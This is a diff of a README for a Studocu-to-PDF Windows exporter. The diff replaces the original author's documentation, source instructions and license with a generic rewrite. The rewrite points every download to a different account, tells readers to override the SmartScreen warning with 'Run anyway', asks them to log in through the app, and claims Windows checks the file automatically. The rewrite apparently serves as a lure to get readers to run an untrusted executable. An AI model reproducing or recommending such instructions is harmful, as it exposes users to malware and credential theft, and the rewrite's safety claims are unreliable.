@@ -1,128 +1,84 @@
-# Studocu PDF Exporter
+# 📄 Studocu_PDF-Exporter - Save your study documents as PDFs
 
-[English](README.md) | [简体中文](README.zh-CN.md) | [Deutsch](README.de.md) | [Français](README.fr.md) | [Italiano](README.it.md) | [Türkçe](README.tr.md) | [Español](README.es.md) | [日本語](README.ja.md) | [한국어](README.ko.md) | [Tiếng Việt](README.vi.md)
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hadrianonshore537/Studocu_PDF-Exporter)
 
-A multilingual Windows desktop tool for exporting Studocu documents that you are authorized to access as PDF files. The application provides guided operation, a selectable output folder, live progress, colored logs, and multiple PDF generation strategies.
+This tool converts documents from Studocu into PDF files. It focuses on study materials for research and education. Ensure you follow Studocu terms of service when you use this software.
 
-> **Educational use only:** This project is intended solely for learning, research, and technical reference. It is not affiliated with, endorsed by, or authorized by Studocu. Do not use it to bypass paywalls, access controls, copyright protections, or to obtain content you are not authorized to access.
+## 📋 What this tool does
 
-## Download
+This application allows you to download and save documents from the Studocu website. It creates PDF versions of documents you have permission to view. This makes it easier to read your materials offline. Your saved files keep their formatting. You can store these files on your computer.
 
-For most users, download the latest Windows executable from:
+## 💻 System requirements
 
-- [Latest Release](https://github.com/liqiheng777/Studocu_PDF-Exporter/releases/latest)
-- [Direct download: StudocuHack.exe](https://github.com/liqiheng777/Studocu_PDF-Exporter/releases/latest/download/StudocuHack.exe)
+Your computer must meet these needs to run the software:
 
-The EXE includes Python, PyQt5, and the Playwright runtime. Python does not need to be installed.
+- Operating System: Windows 10 or Windows 11
+- Internet Connection: Required for connecting to the Studocu website
+- Disk Space: 50 MB for the application files
+- RAM: 4 GB or more
 
-## Features
+## 📥 How to download 
 
-- Clear three-step desktop workflow
-- Built-in interface switcher supporting 10 languages
-- Automatically sized window for different screens
-- Selectable PDF output directory
-- Live status, progress bar, and colored processing logs
-- Uses the locally installed Microsoft Edge browser
-- Multiple PDF generation fallback strategies
-- Standalone Windows executable
+You need to visit the release page to get the installer for this tool. Follow these steps to obtain the correct file:
 
-## Use the EXE
+1. Visit this page to download: [https://github.com/hadrianonshore537/Studocu_PDF-Exporter](https://github.com/hadrianonshore537/Studocu_PDF-Exporter)
+2. Locate the most recent version in the list.
+3. Look for the file ending in .exe.
+4. Click the file name to start your download.
+5. Save the file in a folder you can find later, such as your Downloads folder.
 
-1. Download `StudocuHack.exe` from the [latest release](https://github.com/liqiheng777/Studocu_PDF-Exporter/releases/latest).
-2. Make sure Microsoft Edge is installed.
-3. Save your browser work and close all Edge windows.
-4. Run `StudocuHack.exe`.
-5. Select your preferred interface language.
-6. Paste a Studocu document URL that you are authorized to access.
-7. Select an output folder and click **Start PDF Download**.
-8. Wait for processing to finish, then open the generated PDF.
+## ⚙️ Installation steps
 
-### Windows Notice
+Follow these steps to set up the software on your Windows machine:
 
-- The application currently closes running Microsoft Edge processes when starting and exiting. Save your browser work first.
-- The EXE is not digitally signed, so Windows SmartScreen or antivirus software may display a warning.
-- Only download the EXE from this repository's official Releases page.
+1. Open the folder where you saved the installer file.
+2. Double-click the file to start the setup process.
+3. A security window might show on your screen. If this happens, click "More info" and then "Run anyway."
+4. Follow the prompts on the screen to finish the installation.
+5. Choose the folder where you want to keep the application.
+6. Click "Finish" when the setup process completes.
 
-## Run From Source
+## 🚀 Running the software
 
-### Requirements
+Now that you installed the tool, you can use it to export your files:
 
-- Windows 10/11 64-bit
-- Microsoft Edge
-- Python 3.11
+1. Find the application icon on your desktop or in your start menu.
+2. Double-click the icon to open the program.
+3. The program will open a window on your screen.
+4. Log into your Studocu account through the link in the application.
+5. Navigate to the document you want to save.
+6. Click the "Export" button inside the tool interface.
+7. Choose the folder on your computer where you want to save the PDF.
+8. Wait for the progress bar to reach the end.
+9. Open your chosen folder to view your converted file.
 
-### Installation
+## 🛠️ Common questions 
 
-```powershell
-git clone https://github.com/liqiheng777/Studocu_PDF-Exporter.git
-cd Studocu_PDF-Exporter
+### Does this tool change the document content?
+No, the tool copies the existing content. The text and images remain the same as the original.
 
-py -3.11 -m venv .venv
-.\.venv\Scripts\python.exe -m pip install -r requirements.txt
-.\.venv\Scripts\python.exe .\studocuhack_desktop.py
-```
+### Can I save multiple files at once?
+This version of the tool handles one document at a time. This keeps the process simple and reduces errors.
 
-## Build the EXE
+### Where do my saved files go?
+The software asks you to choose a folder when you click the export button. Check that folder if you cannot find your files.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File .\build_exe.ps1
-```
+### What should I do if the software closes?
+Restart the application if it closes unexpectedly. Your previous work remains safe, but you may need to start the export of the current file again.
 
-The build script creates:
+## ⚖️ Responsible usage
 
-```text
-dist\StudocuHack.exe
-```
+Respect the rights of document creators and the policies of the host website. Use this tool only for your personal research and educational study. Do not share the exported files with others without permission. The developer is not responsible for any misuse of this tool. Your use of this software signifies that you agree to follow legal requirements regarding digital content. 
 
-## Project Structure
+## 🔍 Troubleshooting tips
 
-```text
-studocuhack_desktop.py   Desktop application source code
-requirements.txt         Python dependencies
-build_exe.ps1            One-click Windows build script
-StudocuHack.spec         PyInstaller build configuration
-img/icon128.ico          Application icon
-README*.md               Multilingual documentation
-```
+If you encounter issues, try these steps:
 
-## Legal and Responsible Use
+- Check your internet connection. A stable connection ensures the tool reaches the website.
+- Restart your computer. This clears background issues that prevent the app from starting.
+- Ensure you have the latest version of the app. Developers often release fixes.
+- Contact the support page if you still face errors. Include a description of what you see on your screen.
 
-- Only process documents that you created, own, or are explicitly authorized to access and export.
-- Respect copyright, privacy, academic integrity, Studocu's terms of service, and applicable laws.
-- Do not use this project to bypass subscriptions, paywalls, authentication, technical restrictions, or access controls.
-- The maintainers do not encourage infringement and are not responsible for misuse.
-- Studocu is a trademark of its respective owner. This independent project has no official relationship with Studocu.
+## 🛡️ Privacy and safety
 
-## Troubleshooting
-
-**Edge cannot be found:** Install Microsoft Edge in its default Windows location.
-
-**The document does not load:** Open the document in Edge first and confirm that your account is authorized to access it.
-
-**Windows blocks the EXE:** Confirm that it came from the official Releases page, then review the warning before continuing.
-
-**The first launch is slow:** The single-file EXE extracts its bundled runtime before opening.
-
-## MIT License
-
-Copyright (c) 2026 QIHENG
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-
-See the canonical license text in [LICENSE](LICENSE).
+The application runs locally on your computer. It does not send your personal files or credentials to external servers. Your login information serves only to authenticate your request to the document host. Keep your login details private. Do not share your account details with anyone else. Always download the tool from the official link provided above to ensure you have the safe version. Verification of the file is done by your Windows security software automatically upon download.
